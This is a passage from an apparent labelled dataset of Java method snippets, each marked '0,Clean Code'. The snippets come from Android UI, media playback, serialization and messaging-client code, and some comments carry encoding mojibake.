        dependency.packageName=packageInfo.packageName;
        dependency.displayName=packageInfo.applicationInfo.loadLabel(pm).toString();
        dependency.versionName=packageInfo.versionName;
        dependency.versionCode=PackageInfoCompat.getLongVersionCode(packageInfo);
        dependency.required=true;
        dependency.signatures=null;
        dependency.match=Dependency.DEPENDENCY_MATCH_EXACT;
        dependency.path=path;
        dependencies.add(dependency);
      }
  finally {
        FileCache.getGlobalFileCache().delete(tempFile);
      }
    }
  }
  byte[] meta=getMetadataAsJson().getBytes(StandardCharsets.UTF_8);
  SplitApkExporter.addBytes(zipOutputStream,meta,ApksMetadata.META_FILE,exportTimestamp);
}",0,Clean Code
"private static void verifySpan(TraceAssert trace,SpanDataAssert span,int index,String resource){
  verifySpan(trace,span,index,null,null,null,resource,null);
}
private static void verifySpan(TraceAssert trace,SpanDataAssert span,int index,String resource,SpanData parentSpan){
  verifySpan(trace,span,index,null,null,null,resource,parentSpan);
}
private static void verifySpan(TraceAssert trace,SpanDataAssert span,int index,String exchange,String routingKey,String operation,String resource){
  verifySpan(trace,span,index,exchange,routingKey,operation,resource,null);
}
private static void verifySpan(TraceAssert trace,SpanDataAssert span,int index,String exchange,String routingKey,String operation,String resource,SpanData parentSpan){
  verifySpan(trace,span,index,exchange,routingKey,operation,resource,parentSpan,null,null,null,false);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@68d7dfa6",0,Clean Code
"@Override public final void onBindViewHolder(RecyclerView.ViewHolder holder,int position){
  if (DEBUG)   Log.v(TAG,""onBindViewHolder position "" + position);
  ViewHolder viewHolder=(ViewHolder)holder;
  viewHolder.mItem=mAdapter.get(position);
  viewHolder.mPresenter.onBindViewHolder(viewHolder.mHolder,viewHolder.mItem);
  onBind(viewHolder);
  if (mAdapterListener != null) {
    mAdapterListener.onBind(viewHolder);
  }
}
@Override public final void onBindViewHolder(RecyclerView.ViewHolder holder,int position,List payloads){
  if (DEBUG)   Log.v(TAG,""onBindViewHolder position "" + position);
  ViewHolder viewHolder=(ViewHolder)holder;
  viewHolder.mItem=mAdapter.get(position);
  viewHolder.mPresenter.onBindViewHolder(viewHolder.mHolder,viewHolder.mItem,payloads);
  onBind(viewHolder);
  if (mAdapterListener != null) {
    mAdapterListener.onBind(viewHolder,payloads);
  }
}
",0,Clean Code
"private void visit(H2Constant constant){
  sb.append(constant.toString());
}
private void visit(H2CastNode cast){
  sb.append(""CAST("");
  visit(cast.getExpression());
  sb.append("" AS "");
  sb.append(cast.getType());
  sb.append(')');
}
private void visit(H2Join join){
  visit(join.getLeftTable());
  sb.append("" "");
  sb.append(join.getJoinType());
  sb.append("" JOIN "");
  visit(join.getRightTable());
  if (join.getOnCondition() != null) {
    sb.append("" ON "");
    visit(join.getOnCondition());
  }
}
public void visit(H2Select select){
  sb.append(""SELECT "");
  visit(select.getFetchColumns());
  sb.append("" FROM "");
  visit(select.getFromList());
  if (!select.getFromList().isEmpty() && !select.getJoinList().isEmpty()) {
    sb.append("", "");
  }
  if (!select.getJoinList().isEmpty()) {
    visit(select.getJoinList());
  }
  if (select.getWhereClause() != null) {
    sb.append("" WHERE "");
    visit(select.getWhereClause());
  }
  if (!select.getGroupByExpressions().isEmpty()) {
    sb.append("" GROUP BY "");
    visit(select.getGroupByExpressions());
  }
  if (select.getHavingClause() != null) {
    sb.append("" HAVING "");
    visit(select.getHavingClause());
  }
  if (!select.getOrderByClauses().isEmpty()) {
    sb.append("" ORDER BY "");
    visit(select.getOrderByClauses());
  }
  if (select.getLimitClause() != null) {
    sb.append("" LIMIT "");
    visit(select.getLimitClause());
  }
  if (select.getOffsetClause() != null) {
    sb.append("" OFFSET "");
    visit(select.getOffsetClause());
  }
}",0,Clean Code
"Person parse(GroupableDslContext context,Tokens tokens){
  if (tokens.hasMoreThan(TAGS_INDEX)) {
    throw new RuntimeException(""Too many tokens, expected: "" + GRAMMAR);
  }
  if (!tokens.includes(NAME_INDEX)) {
    throw new RuntimeException(""Expected: "" + GRAMMAR);
  }
  Person person=null;
  String name=tokens.get(NAME_INDEX);
  if (context.isExtendingWorkspace()) {
    person=context.getWorkspace().getModel().getPersonWithName(name);
  }
  if (person == null) {
    person=context.getWorkspace().getModel().addPerson(name);
  }
  String description="""";
  if (tokens.includes(DESCRIPTION_INDEX)) {
    description=tokens.get(DESCRIPTION_INDEX);
    person.setDescription(description);
  }
  if (tokens.includes(TAGS_INDEX)) {
    String tags=tokens.get(TAGS_INDEX);
    person.addTags(tags.split("",""));
  }
  if (context instanceof EnterpriseDslContext) {
    person.setLocation(Location.Internal);
  }
  if (context.hasGroup()) {
    person.setGroup(context.getGroup().getName());
    context.getGroup().addElement(person);
  }
  return person;
}
",0,Clean Code
"private void hideActionMode(){
  if (actionBar != null) {
    if (!actionBar.isActionModeShowed()) {
      return;
    }
    actionBar.hideActionMode();
  }
  cantDeleteMessagesCount=0;
  canEditMessagesCount=0;
  cantForwardMessagesCount=0;
  canSaveMusicCount=0;
  canSaveDocumentsCount=0;
  cantSaveMessagesCount=0;
  if (chatActivityEnterView != null) {
    EditTextCaption editTextCaption=chatActivityEnterView.getEditField();
    if (editTextCaption != null) {
      if (chatActivityEnterView.getVisibility() == View.VISIBLE) {
        editTextCaption.requestFocus();
      }
      editTextCaption.setAllowDrawCursor(true);
    }
  }
  if (textSelectionHelper != null) {
    textSelectionHelper.clear(true);
    textSelectionHelper.cancelAllAnimators();
  }
  if (textSelectionHint != null) {
    textSelectionHint.hide();
  }
  if (chatActivityEnterView != null) {
    chatActivityEnterView.preventInput=false;
  }
  textSelectionHintWasShowed=false;
  if (tagSelector != null) {
    hideTagSelector();
  }
}",0,Clean Code
"private boolean hasChanges(){
  hasUserChanged=false;
  if (filter.alwaysShow.size() != newAlwaysShow.size()) {
    hasUserChanged=true;
  }
  if (filter.neverShow.size() != newNeverShow.size()) {
    hasUserChanged=true;
  }
  if (!hasUserChanged) {
    Collections.sort(filter.alwaysShow);
    Collections.sort(newAlwaysShow);
    if (!filter.alwaysShow.equals(newAlwaysShow)) {
      hasUserChanged=true;
    }
    Collections.sort(filter.neverShow);
    Collections.sort(newNeverShow);
    if (!filter.neverShow.equals(newNeverShow)) {
      hasUserChanged=true;
    }
  }
  if (!TextUtils.equals(filter.name,newFilterName)) {
    return true;
  }
  if (filter.flags != newFilterFlags) {
    return true;
  }
  return hasUserChanged;
}
",0,Clean Code
"@Override public String toString(){
  StringBuilder sb=new StringBuilder();
  sb.append(getClass().getSimpleName());
  sb.append("" ["");
  sb.append(""Hash = "").append(hashCode());
  sb.append("", id="").append(id);
  sb.append("", appId="").append(appId);
  sb.append("", permissionCode="").append(permissionCode);
  sb.append("", permissionName="").append(permissionName);
  sb.append("", permissionTitle="").append(permissionTitle);
  sb.append("", permissionType="").append(permissionType);
  sb.append("", isEnable="").append(isEnable);
  sb.append("", memo="").append(memo);
  sb.append("", serialVersionUID="").append(serialVersionUID);
  sb.append(""]"");
  return sb.toString();
}
",0,Clean Code
"@Test public void testAllActivatedTrackSelectionAreReleasedForMultiPeriods() throws Exception {
  Timeline timeline=new FakeTimeline(2);
  MediaSource mediaSource=new FakeMediaSource(timeline,null,Builder.VIDEO_FORMAT,Builder.AUDIO_FORMAT);
  FakeRenderer videoRenderer=new FakeRenderer(Builder.VIDEO_FORMAT);
  FakeRenderer audioRenderer=new FakeRenderer(Builder.AUDIO_FORMAT);
  FakeTrackSelector trackSelector=new FakeTrackSelector();
  new Builder().setMediaSource(mediaSource).setRenderers(videoRenderer,audioRenderer).setTrackSelector(trackSelector).build(context).start().blockUntilEnded(TIMEOUT_MS);
  List<FakeTrackSelection> createdTrackSelections=trackSelector.getAllTrackSelections();
  int numSelectionsEnabled=0;
  for (  FakeTrackSelection trackSelection : createdTrackSelections) {
    assertThat(trackSelection.isEnabled).isFalse();
    numSelectionsEnabled+=trackSelection.enableCount;
  }
  assertThat(createdTrackSelections).hasSize(4);
  assertThat(numSelectionsEnabled).isEqualTo(4);
}",0,Clean Code
"@TruffleBoundary @Specialization protected String eval(String self,String pattern,String replacement){
  var idx=self.lastIndexOf(pattern);
  if (idx == -1)   return self;
  return self.substring(0,idx) + replacement + self.substring(idx + pattern.length());
}
@TruffleBoundary @Specialization protected String eval(String self,VmRegex regex,String replacement){
  try {
    var matcher=regex.matcher(self);
    if (!findLast(matcher))     return self;
    var result=new StringBuilder();
    matcher.appendReplacement(result,replacement);
    matcher.appendTail(result);
    return result.toString();
  }
 catch (  IndexOutOfBoundsException|IllegalArgumentException e) {
    throw exceptionBuilder().evalError(""errorInRegexReplacement"",regex.getPattern(),replacement,e.getMessage()).build();
  }
}",0,Clean Code
"public static void tick(){
  AbstractContraptionEntity entity=entityRef.get();
  if (entity == null)   return;
  if (packetCooldown > 0)   packetCooldown--;
  if (entity.isRemoved() || InputConstants.isKeyDown(Minecraft.getInstance().getWindow().getWindow(),GLFW.GLFW_KEY_ESCAPE)) {
    BlockPos pos=controlsPos;
    stopControlling();
    AllPackets.getChannel().sendToServer(new ControlsInputPacket(currentlyPressed,false,entity.getId(),pos,true));
    return;
  }
  Vector<KeyMapping> controls=ControlsUtil.getControls();
  Collection<Integer> pressedKeys=new HashSet<>();
  for (int i=0; i < controls.size(); i++) {
    if (ControlsUtil.isActuallyPressed(controls.get(i)))     pressedKeys.add(i);
  }
  Collection<Integer> newKeys=new HashSet<>(pressedKeys);
  Collection<Integer> releasedKeys=currentlyPressed;
  newKeys.removeAll(releasedKeys);
  releasedKeys.removeAll(pressedKeys);
  if (!releasedKeys.isEmpty()) {
    AllPackets.getChannel().sendToServer(new ControlsInputPacket(releasedKeys,false,entity.getId(),controlsPos,false));
  }
  if (!newKeys.isEmpty()) {
    AllPackets.getChannel().sendToServer(new ControlsInputPacket(newKeys,true,entity.getId(),controlsPos,false));
    packetCooldown=PACKET_RATE;
  }
  if (packetCooldown == 0) {
    AllPackets.getChannel().sendToServer(new ControlsInputPacket(pressedKeys,true,entity.getId(),controlsPos,false));
    packetCooldown=PACKET_RATE;
  }
  currentlyPressed=pressedKeys;
  controls.forEach(kb -> kb.setDown(false));
}",0,Clean Code
"@Override public Collection onCollectionRead(Collection collection){
  if (Platform.JAVA_VERSION > 8) {
    CollectionContainer container=(CollectionContainer)collection;
    try {
      collection=(List)listFactory.invoke(container.elements);
    }
 catch (    Throwable e) {
      throw new RuntimeException(e);
    }
  }
 else {
    collection=Collections.unmodifiableList((List)collection);
  }
  return collection;
}
@Override public Collection onCollectionRead(Collection collection){
  if (Platform.JAVA_VERSION > 8) {
    CollectionContainer container=(CollectionContainer)collection;
    try {
      collection=(Set)setFactory.invoke(container.elements);
    }
 catch (    Throwable e) {
      throw new RuntimeException(e);
    }
  }
 else {
    collection=Collections.unmodifiableSet((HashSet)collection);
  }
  return collection;
}",0,Clean Code
"/** 
 * Reads whole (including chunk type) string block from stream. Stream must be at the chunk type.
 */
public static StringBlock read(LEDataInputStream reader) throws IOException {
  StringBlock block=new StringBlock();
  block.ChunkTypeInt=reader.skipCheckChunkTypeInt(CHUNK_STRINGPOOL_TYPE,CHUNK_NULL_TYPE);
  block.chunkSize=reader.readInt();
  block.stringCount=reader.readInt();
  block.styleOffsetCount=reader.readInt();
  block.flags=reader.readInt();
  block.stringsOffset=reader.readInt();
  block.stylesOffset=reader.readInt();
  block.m_isUTF8=(block.flags & UTF8_FLAG) != 0;
  block.m_stringOffsets=reader.readIntArray(block.stringCount);
  if (block.styleOffsetCount != 0) {
    block.m_styleOffsets=reader.readIntArray(block.styleOffsetCount);
  }
{
    int size=((block.stylesOffset == 0) ? block.chunkSize : block.stylesOffset) - block.stringsOffset;
    if ((size % 4) != 0) {
      throw new IOException(""String data size is not multiple of 4 ("" + size + "")."");
    }
    block.m_strings=new byte[size];
    reader.readFully(block.m_strings);
    block.strings=new ArrayList<String>();
    for (int i=0; i < block.stringCount; i++) {
      block.strings.add(block.getString(i));
    }
  }
  if (block.stylesOffset != 0) {
    int size=(block.chunkSize - block.stylesOffset);
    if ((size % 4) != 0) {
      throw new IOException(""Style data size is not multiple of 4 ("" + size + "")."");
    }
    block.m_styles=reader.readIntArray(size / 4);
    int remaining=size % 4;
    if (remaining >= 1) {
      while (remaining-- > 0) {
        reader.skipByte();
      }
    }
  }
  return block;
}",0,Clean Code
"private Object[] read3DArray(MemoryBuffer buffer){
  int numElements=buffer.readVarUint32Small7();
  boolean isFinal=(numElements & 0b1) != 0;
  numElements>>>=1;
  RefResolver refResolver=fury.getRefResolver();
  Object[][][] value=new Object[numElements][][];
  refResolver.reference(value);
  if (isFinal) {
    for (int i=0; i < numElements; i++) {
      Object[][] elem;
      int nextReadRefId=refResolver.tryPreserveRefId(buffer);
      if (nextReadRefId >= Fury.NOT_NULL_VALUE_FLAG) {
        elem=read2DArray(buffer);
        refResolver.setReadObject(nextReadRefId,elem);
      }
 else {
        elem=(Object[][])refResolver.getReadObject();
      }
      value[i]=elem;
    }
  }
 else {
    for (int i=0; i < numElements; i++) {
      value[i]=(Object[][])fury.readRef(buffer);
    }
  }
  return value;
}",0,Clean Code
"public SpacingAndPunctuations(final Resources res,final Boolean urlDetection){
  mSortedSymbolsPrecededBySpace=StringUtils.toSortedCodePointArray(res.getString(R.string.symbols_preceded_by_space));
  mSortedSymbolsFollowedBySpace=StringUtils.toSortedCodePointArray(res.getString(R.string.symbols_followed_by_space));
  mSortedSymbolsClusteringTogether=StringUtils.toSortedCodePointArray(res.getString(R.string.symbols_clustering_together));
  mSortedWordConnectors=StringUtils.toSortedCodePointArray(res.getString(R.string.symbols_word_connectors));
  mSortedWordSeparators=StringUtils.toSortedCodePointArray(res.getString(R.string.symbols_word_separators));
  mSortedSentenceTerminators=StringUtils.toSortedCodePointArray(res.getString(R.string.symbols_sentence_terminators));
  mSentenceSeparator=res.getInteger(R.integer.sentence_separator);
  mAbbreviationMarker=res.getInteger(R.integer.abbreviation_marker);
  mSentenceSeparatorAndSpace=new String(new int[]{mSentenceSeparator,Constants.CODE_SPACE},0,2);
  mCurrentLanguageHasSpaces=res.getBoolean(R.bool.current_language_has_spaces);
  mSortedSometimesWordConnectors=(urlDetection && mCurrentLanguageHasSpaces) ? StringUtils.toSortedCodePointArray(res.getString(R.string.symbols_sometimes_word_connectors)) : new int[0];
  final Locale locale=ConfigurationCompatKt.locale(res.getConfiguration());
  mUsesAmericanTypography=Locale.ENGLISH.getLanguage().equals(locale.getLanguage());
  mUsesGermanRules=Locale.GERMAN.getLanguage().equals(locale.getLanguage());
  final String[] suggestPuncsSpec=PopupKeySpec.splitKeySpecs(res.getString(R.string.suggested_punctuations));
  mSuggestPuncList=PunctuationSuggestions.newPunctuationSuggestions(suggestPuncsSpec);
}",0,Clean Code
"/** 
 * Check request topic list of consumer
 * @param depTopicSet  the deployed topic set
 * @param reqTopicLst the topic list to be checked.
 * @param strBuff   a string buffer used to construct the result
 * @param result    process result
 * @return the check result
 */
public static boolean checkConsumerTopicList(Set<String> depTopicSet,List<String> reqTopicLst,StringBuilder strBuff,ProcessResult result){
  if ((reqTopicLst == null) || (reqTopicLst.isEmpty())) {
    result.setFailResult(TErrCodeConstants.BAD_REQUEST,""Request miss necessary subscribed topicList data!"");
    return result.isSuccess();
  }
  Set<String> transTopicSet=new HashSet<>();
  for (  String topicItem : reqTopicLst) {
    if (TStringUtils.isBlank(topicItem)) {
      continue;
    }
    transTopicSet.add(topicItem.trim());
  }
  if (transTopicSet.isEmpty()) {
    result.setFailResult(TErrCodeConstants.BAD_REQUEST,""Request subscribed topicList data must not Blank!"");
    return result.isSuccess();
  }
  if (transTopicSet.size() > TBaseConstants.META_MAX_BOOKED_TOPIC_COUNT) {
    result.setFailResult(TErrCodeConstants.BAD_REQUEST,strBuff.append(""Subscribed topicList size over max value, required max count is "").append(TBaseConstants.META_MAX_BOOKED_TOPIC_COUNT).toString());
    strBuff.delete(0,strBuff.length());
    return result.isSuccess();
  }
  Set<String> invalidTopicSet=new HashSet<>();
  for (  String reqTopic : transTopicSet) {
    if (!depTopicSet.contains(reqTopic)) {
      invalidTopicSet.add(reqTopic);
    }
  }
  if (!invalidTopicSet.isEmpty()) {
    result.setFailResult(TErrCodeConstants.TOPIC_NOT_DEPLOYED,strBuff.append(""Requested topic ["").append(invalidTopicSet).append(""] not deployed!"").toString());
    strBuff.delete(0,strBuff.length());
    return result.isSuccess();
  }
  result.setSuccResult(transTopicSet);
  return result.isSuccess();
}",0,Clean Code
"/** 
 * Converts this  {@link GenericArrayData} into an array of Java {@link Object}. <p>The method will convert a primitive array into an object array. But it will not convert internal data structures into external data structures (e.g.  {@link StringData} to {@link String}).
 */
public Object[] toObjectArray(){
  if (isPrimitiveArray) {
    Class<?> arrayClass=array.getClass();
    if (int[].class.equals(arrayClass)) {
      return ArrayUtils.toObject((int[])array);
    }
 else     if (long[].class.equals(arrayClass)) {
      return ArrayUtils.toObject((long[])array);
    }
 else     if (float[].class.equals(arrayClass)) {
      return ArrayUtils.toObject((float[])array);
    }
 else     if (double[].class.equals(arrayClass)) {
      return ArrayUtils.toObject((double[])array);
    }
 else     if (short[].class.equals(arrayClass)) {
      return ArrayUtils.toObject((short[])array);
    }
 else     if (byte[].class.equals(arrayClass)) {
      return ArrayUtils.toObject((byte[])array);
    }
 else     if (boolean[].class.equals(arrayClass)) {
      return ArrayUtils.toObject((boolean[])array);
    }
    throw new RuntimeException(""Unsupported primitive array: "" + arrayClass);
  }
 else {
    return (Object[])array;
  }
}
",0,Clean Code
"/** 
 * {@link AudioTrack#getPlaybackHeadPosition()} returns a value intended to be interpreted as anunsigned 32 bit integer, which also wraps around periodically. This method returns the playback head position as a long that will only wrap around if the value exceeds  {@link Long#MAX_VALUE}(which in practice will never happen).
 * @return The playback head position, in frames.
 */
private long getPlaybackHeadPosition(){
  AudioTrack audioTrack=Assertions.checkNotNull(this.audioTrack);
  if (stopTimestampUs != C.TIME_UNSET) {
    long elapsedTimeSinceStopUs=(SystemClock.elapsedRealtime() * 1000) - stopTimestampUs;
    long framesSinceStop=(elapsedTimeSinceStopUs * outputSampleRate) / C.MICROS_PER_SECOND;
    return Math.min(endPlaybackHeadPosition,stopPlaybackHeadPosition + framesSinceStop);
  }
  int state=audioTrack.getPlayState();
  if (state == PLAYSTATE_STOPPED) {
    return 0;
  }
  long rawPlaybackHeadPosition=0;
  if (isLatencyQuirkEnabled) {
    int php=audioTrack.getPlaybackHeadPosition();
    if (VDBG) {
      log.v(""php = "" + php);
    }
    int trackState=audioTrack.getPlayState();
    if (trackState == PLAYSTATE_PLAYING || (trackState == PLAYSTATE_PAUSED && php != 0)) {
      php+=getAudioSWLatencies();
    }
    if (php < 0 && ((System.nanoTime() / 1000) - resumeSystemTimeUs) < C.MICROS_PER_SECOND) {
      php=0;
      log.i(""php is negative during latency stabilization phase ...resetting to 0"");
    }
    rawPlaybackHeadPosition=0xFFFFFFFFL & php;
  }
 else {
    rawPlaybackHeadPosition=0xFFFFFFFFL & audioTrack.getPlaybackHeadPosition();
    if (VDBG) {
      log.v(""rawPlaybackHeadPosition = "" + rawPlaybackHeadPosition);
    }
    if (needsPassthroughWorkarounds) {
      if (state == PLAYSTATE_PAUSED && rawPlaybackHeadPosition == 0) {
        passthroughWorkaroundPauseOffset=lastRawPlaybackHeadPosition;
      }
      rawPlaybackHeadPosition+=passthroughWorkaroundPauseOffset;
    }
  }
  if (Util.SDK_INT <= 29) {
    if (rawPlaybackHeadPosition == 0 && lastRawPlaybackHeadPosition > 0 && state == PLAYSTATE_PLAYING) {
      if (forceResetWorkaroundTimeMs == C.TIME_UNSET) {
        forceResetWorkaroundTimeMs=SystemClock.elapsedRealtime();
      }
      return lastRawPlaybackHeadPosition;
    }
 else {
      forceResetWorkaroundTimeMs=C.TIME_UNSET;
    }
  }
  if (lastRawPlaybackHeadPosition > rawPlaybackHeadPosition && lastRawPlaybackHeadPosition > 0x7FFFFFFFL && (lastRawPlaybackHeadPosition - rawPlaybackHeadPosition >= 0x7FFFFFFFL)) {
    log.i(""The playback head position wrapped around"");
    rawPlaybackHeadWrapCount++;
  }
  lastRawPlaybackHeadPosition=rawPlaybackHeadPosition;
  return rawPlaybackHeadPosition + (rawPlaybackHeadWrapCount << 32);
}",0,Clean Code
"private void fillUpWorkClientWithLastBadClient(){
  int currentRealSize=aliveConnections - clientMapData.size();
  List<HostInfo> pendingBadList=new ArrayList<>();
  for (  Map.Entry<HostInfo,AtomicLong> entry : lastBadHostMap.entrySet()) {
    if (pendingBadList.size() < currentRealSize) {
      pendingBadList.add(entry.getKey());
    }
 else {
      for (int index=0; index < pendingBadList.size(); index++) {
        if (entry.getValue().get() < lastBadHostMap.get(pendingBadList.get(index)).get()) {
          pendingBadList.set(index,entry.getKey());
        }
      }
    }
  }
  List<HostInfo> replaceHostLists=getRealHosts(pendingBadList,currentRealSize);
  if (replaceHostLists.size() > 0) {
    logger.info(""replace bad connection, use last bad list, "" + ""last bad list {}, client Map data {}"",lastBadHostMap.size(),clientMapData.size());
  }
  for (  HostInfo hostInfo : replaceHostLists) {
    boolean isSuccess=initConnection(hostInfo);
    if (isSuccess) {
      lastBadHostMap.remove(hostInfo);
    }
  }
}",0,Clean Code
"/** 
 * 鏌ヨ蹇掕建杩
 * @see <a href=""https://api.kuaidi100.com/debug-tool/query/"">鎺ュ彛鏂囨。</a>
 * @param reqDTO 鏌ヨ璇锋眰鍙傛暟
 * @return 蹇掕建杩
 */
@Override public List<ExpressTrackRespDTO> getExpressTrackList(ExpressTrackQueryReqDTO reqDTO){
  Kd100ExpressQueryReqDTO requestDTO=INSTANCE.convert2(reqDTO).setExpressCode(reqDTO.getExpressCode().toLowerCase());
  Kd100ExpressQueryRespDTO respDTO=httpRequest(REAL_TIME_QUERY_URL,requestDTO,Kd100ExpressQueryRespDTO.class);
  if (Objects.equals(""false"",respDTO.getResult())) {
    throw exception(EXPRESS_API_QUERY_FAILED,respDTO.getMessage());
  }
  if (CollUtil.isEmpty(respDTO.getTracks())) {
    return Collections.emptyList();
  }
  return INSTANCE.convertList2(respDTO.getTracks());
}",0,Clean Code
"private void fillUpWorkClientWithLastBadClient(){
  int currentRealSize=aliveConnections - clientMapData.size();
  List<HostInfo> pendingBadList=new ArrayList<>();
  for (  Map.Entry<HostInfo,AtomicLong> entry : lastBadHostMap.entrySet()) {
    if (pendingBadList.size() < currentRealSize) {
      pendingBadList.add(entry.getKey());
    }
 else {
      for (int index=0; index < pendingBadList.size(); index++) {
        if (entry.getValue().get() < lastBadHostMap.get(pendingBadList.get(index)).get()) {
          pendingBadList.set(index,entry.getKey());
        }
      }
    }
  }
  List<HostInfo> replaceHostLists=getRealHosts(pendingBadList,currentRealSize);
  if (replaceHostLists.size() > 0) {
    logger.info(""replace bad connection, use last bad list, "" + ""last bad list {}, client Map data {}"",lastBadHostMap.size(),clientMapData.size());
  }
  for (  HostInfo hostInfo : replaceHostLists) {
    boolean isSuccess=initConnection(hostInfo);
    if (isSuccess) {
      lastBadHostMap.remove(hostInfo);
    }
  }
}",0,Clean Code
"void saveFragmentViewState(Fragment f){
  if (f.mInnerView == null) {
    return;
  }
  if (mStateArray == null) {
    mStateArray=new SparseArray<Parcelable>();
  }
 else {
    mStateArray.clear();
  }
  f.mInnerView.saveHierarchyState(mStateArray);
  if (mStateArray.size() > 0) {
    f.mSavedViewState=mStateArray;
    mStateArray=null;
  }
}",0,Clean Code
"@Override public String genericSignature(Object type){
  JavaType.GenericTypeVariable gtv=(JavaType.GenericTypeVariable)type;
  StringBuilder s=new StringBuilder(""Generic{"" + gtv.getName());
  if (typeVariableNameStack == null) {
    typeVariableNameStack=new LinkedHashSet<>();
  }
  if (!gtv.getName().equals(""?"") && !typeVariableNameStack.add(gtv.getName())) {
    s.append('}');
    return s.toString();
  }
switch (gtv.getVariance()) {
case INVARIANT:
    break;
case COVARIANT:
  s.append("" extends "");
break;
case CONTRAVARIANT:
s.append("" super "");
break;
}
StringJoiner bounds=new StringJoiner("" & "");
for (JavaType bound : gtv.getBounds()) {
if (parameterizedStack == null || !parameterizedStack.contains(bound)) {
bounds.add(signature(bound));
}
}
s.append(bounds).append('}');
typeVariableNameStack.remove(gtv.getName());
return s.toString();
}
",0,Clean Code
"/** 
 * Returns  {@link FakeRendererCapabilities} that advertises adaptive support for alltracks of the given type.
 * @param trackType the track type of all formats that this renderer capabilities advertisessupport for.
 */
FakeRendererCapabilities(int trackType){
  this(trackType,FORMAT_HANDLED | ADAPTIVE_SEAMLESS);
}
/** 
 * Returns  {@link FakeRendererCapabilities} that advertises support level using given valuefor all tracks of the given type.
 * @param trackType the track type of all formats that this renderer capabilities advertisessupport for.
 * @param supportValue the support level value that will be returned for formats withthe given type.
 */
FakeRendererCapabilities(int trackType,int supportValue){
  this.trackType=trackType;
  this.supportValue=supportValue;
}
",0,Clean Code
"@Override public String signature(@Nullable Object t){
  if (t == null) {
    return ""{undefined}"";
  }
  if (t instanceof Class) {
    Class<?> clazz=(Class<?>)t;
    if (clazz.isArray()) {
      return arraySignature(clazz);
    }
 else     if (clazz.isPrimitive()) {
      return primitiveSignature(clazz);
    }
    StringBuilder s=new StringBuilder(classSignature(clazz));
    if (clazz.getTypeParameters().length > 0) {
      StringJoiner typeParams=new StringJoiner("", "",""<"","">"");
      for (      TypeVariable<?> typeParameter : clazz.getTypeParameters()) {
        typeParams.add(signature(typeParameter));
      }
      s.append(typeParams);
    }
    return s.toString();
  }
 else   if (t instanceof ParameterizedType) {
    return parameterizedSignature(t);
  }
 else   if (t instanceof WildcardType) {
    return genericSignature(t);
  }
 else   if (t instanceof TypeVariable) {
    return genericSignature(t);
  }
 else   if (t instanceof GenericArrayType) {
    return arraySignature(t);
  }
  throw new UnsupportedOperationException(""Unknown type "" + t.getClass().getName());
}",0,Clean Code
"/** 
 * Reads into  {@link #flagsOnlyBuffer} and returns whether a format was read. 
 */
private boolean readToFlagsOnlyBuffer(boolean requireFormat) throws ExoPlaybackException {
  flagsOnlyBuffer.clear();
  int result=readSource(formatHolder,flagsOnlyBuffer,requireFormat);
  if (result == C.RESULT_FORMAT_READ) {
    onInputFormatChanged(formatHolder.format);
    return true;
  }
 else   if (result == C.RESULT_BUFFER_READ && flagsOnlyBuffer.isEndOfStream()) {
    inputStreamEnded=true;
    processEndOfStream();
  }
  return false;
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)50);
    output.writeMessageNoTag(buffInfo);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)82);
    output.writeMessageNoTag(miracleInfo);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)90);
    output.writeMessageNoTag(itemInfo);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeMessage(FieldNames.buffInfo,buffInfo);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeMessage(FieldNames.miracleInfo,miracleInfo);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeMessage(FieldNames.itemInfo,itemInfo);
  }
  output.endObject();
}",0,Clean Code
"/** 
 * 鐢ㄦ埛鐧诲嚭
 * @return vo
 */
@ApiOperation(""閫�鍑虹櫥褰�"") @ApiImplicitParam(name=""ticket"",value=""鐧诲綍鐨則icket"") @RequestMapping(value=""/manage/logout"",method=RequestMethod.GET) @ResponseBody public SysResult logoutUser(@CookieValue(""EM_TICKET"") String ticket,HttpServletRequest request,HttpServletResponse response){
  try {
    this.userService.deleteTicket(ticket);
    CookieUtils.deleteCookie(request,response,""EM_TICKET"");
    CookieUtils.deleteCookie(request,response,""USERNAME"");
    CookieUtils.deleteCookie(request,response,""PASSWORD"");
    return SysResult.ok();
  }
 catch (  Exception e) {
    e.printStackTrace();
    return SysResult.build(500,e.getMessage(),e);
  }
}",0,Clean Code
"private CharSequence getMessageCaption(MessageObject messageObject,MessageObject.GroupedMessages group){
  return getMessageCaption(messageObject,group,null);
}
private CharSequence getMessageCaption(MessageObject messageObject,MessageObject.GroupedMessages group,int[] msgId){
  if (messageObject == null) {
    return null;
  }
  String restrictionReason=MessagesController.getRestrictionReason(messageObject.messageOwner.restriction_reason);
  if (!TextUtils.isEmpty(restrictionReason)) {
    return restrictionReason;
  }
  if (messageObject.isVoiceTranscriptionOpen() && !TranscribeButton.isTranscribing(messageObject)) {
    return messageObject.getVoiceTranscription();
  }
  if (messageObject.caption != null) {
    return messageObject.caption;
  }
  if (group == null) {
    return null;
  }
  CharSequence caption=null;
  for (int a=0, N=group.messages.size(); a < N; a++) {
    MessageObject message=group.messages.get(a);
    if (message.caption != null) {
      if (caption != null) {
        return null;
      }
      caption=message.caption;
      if (msgId != null) {
        msgId[0]=message.getId();
      }
    }
  }
  return caption;
}",0,Clean Code
"@Override public J.VariableDeclarations visitVariableDeclarations(J.VariableDeclarations multiVariable,P p){
  J.VariableDeclarations v=super.visitVariableDeclarations(multiVariable,p);
  boolean first=v.getLeadingAnnotations().isEmpty();
  if (first && !v.getModifiers().isEmpty()) {
    v=v.withModifiers(ListUtils.map(v.getModifiers(),(index,modifier) -> {
      if (index != 0) {
        if (modifier.getPrefix().isEmpty()) {
          modifier=modifier.withPrefix(modifier.getPrefix().withWhitespace("" ""));
        }
      }
      return modifier;
    }
));
    first=false;
  }
  if (!first && v.getTypeExpression() != null) {
    if (v.getTypeExpression().getPrefix().isEmpty()) {
      v=v.withTypeExpression(v.getTypeExpression().withPrefix(v.getTypeExpression().getPrefix().withWhitespace("" "")));
    }
  }
  J firstEnclosing=getCursor().getParentOrThrow().firstEnclosing(J.class);
  if (!(firstEnclosing instanceof J.Lambda)) {
